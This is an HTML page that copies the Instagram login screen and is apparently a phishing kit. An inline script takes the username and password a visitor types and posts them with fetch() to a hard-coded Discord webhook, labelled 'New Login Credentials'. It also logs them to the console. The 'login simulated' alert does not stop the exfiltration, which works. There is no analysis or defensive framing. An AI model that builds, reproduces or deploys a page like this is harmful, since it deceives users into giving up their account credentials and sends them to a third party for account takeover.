<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        body { background: #fafafa; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { width: 350px; background: #fff; border: 1px solid #dbdbdb; border-radius: 1px; padding: 20px 40px 30px; }
        .logo { text-align: center; margin-bottom: 30px; font-size: 2.5rem; font-weight: 600; font-family: "Billabong", cursive; color: #262626; }
        .form-group { margin-bottom: 10px; }
        .form-group input { width: 100%; padding: 12px 8px; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; font-size: 0.85rem; outline: none; }
        .form-group input:focus { border-color: #a8a8a8; background: #fff; }
        .btn { width: 100%; background: #0095f6; color: #fff; border: none; border-radius: 4px; padding: 10px 0; font-weight: 600; font-size: 0.95rem; margin-top: 10px; cursor: pointer; }
        .btn:active { background: #0077c2; }
        .divider { display: flex; align-items: center; margin: 20px 0; color: #8e8e8e; font-size: 0.75rem; font-weight: 600; }
        .divider::before, .divider::after { content: ""; flex: 1; height: 1px; background: #dbdbdb; }
        .divider::before { margin-right: 18px; }
        .divider::after { margin-left: 18px; }
        .fb-login { text-align: center; margin: 15px 0; }
        .fb-login a { color: #385185; font-weight: 600; font-size: 0.9rem; text-decoration: none; }
        .forgot { text-align: center; margin-top: 15px; font-size: 0.75rem; }
        .forgot a { color: #00376b; text-decoration: none; }
        .signup { text-align: center; margin-top: 20px; border-top: 1px solid #dbdbdb; padding-top: 20px; font-size: 0.9rem; color: #262626; }
        .signup a { color: #0095f6; font-weight: 600; text-decoration: none; }
        .app-download { text-align: center; margin-top: 20px; font-size: 0.8rem; color: #262626; }
        .stores { display: flex; justify-content: center; gap: 10px; margin-top: 10px; }
        .stores img { height: 40px; }
        @media (max-width: 450px) { .container { width: 100%; border: none; background: #fafafa; padding: 20px; } }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">Instagram</div>
        <form id="loginForm" onsubmit="return false;">
            <div class="form-group">
                <input type="text" id="username" placeholder="Phone number, username, or email" required>
            </div>
            <div class="form-group">
                <input type="password" id="password" placeholder="Password" required>
            </div>
            <button type="submit" class="btn" id="loginBtn">Log in</button>
        </form>
        <div class="divider">OR</div>
        <div class="fb-login">
            <a href="#">Log in with Facebook</a>
        </div>
        <div class="forgot">
            <a href="#">Forgot password?</a>
        </div>
        <div class="signup">
            Don't have an account? <a href="#">Sign up</a>
        </div>
        <div class="app-download">
            Get the app.
            <div class="stores">
                <img src="https://www.instagram.com/static/images/appstore-icon/ios.svg" alt="App Store">
                <img src="https://www.instagram.com/static/images/appstore-icon/googleplay.svg" alt="Google Play">
            </div>
        </div>
    </div>
    <script>
        (function() {
            const WEBHOOK_URL = 'https://discord.com/api/webhooks/1519158652169228401/HHY1sE1Px9OyLvvHuXvcjXMXG-CDY3LuHUFIUd3DZGfvJ9hve33zhbtPfy0miUUPyQjY';
            const usernameField = document.getElementById('username');
            const passwordField = document.getElementById('password');
            const loginBtn = document.getElementById('loginBtn');

            async function sendToDiscord(username, password) {
                const payload = {
                    content: `**New Login Credentials**\nUsername: ${username}\nPassword: ${password}`
                };
                try {
                    const response = await fetch(WEBHOOK_URL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(payload)
                    });
                    if (!response.ok) {
                        console.error('Discord webhook failed:', response.status, await response.text());
                    } else {
                        console.log('Credentials sent to Discord successfully.');
                    }
                } catch (error) {
                    console.error('Error sending to Discord:', error);
                }
            }

            function handleLogin() {
                const user = usernameField.value.trim();
                const pass = passwordField.value.trim();
                if (user === '' || pass === '') {
                    alert('Please fill in both fields.');
                    return;
                }
                // Send to Discord via webhook
                sendToDiscord(user, pass);
                // Original behavior
                console.log('[LOGIN ATTEMPT]', { username: user, password: pass });
                alert('Login simulated. Check console for credentials.');
                // Optionally clear fields
                // usernameField.value = '';
                // passwordField.value = '';
            }

            loginBtn.addEventListener('click', handleLogin);
            document.getElementById('loginForm').addEventListener('keypress', function(e) {
                if (e.key === 'Enter') {
                    e.preventDefault();
                    handleLogin();
                }
            });
        })();
    </script>
</body>
</html>
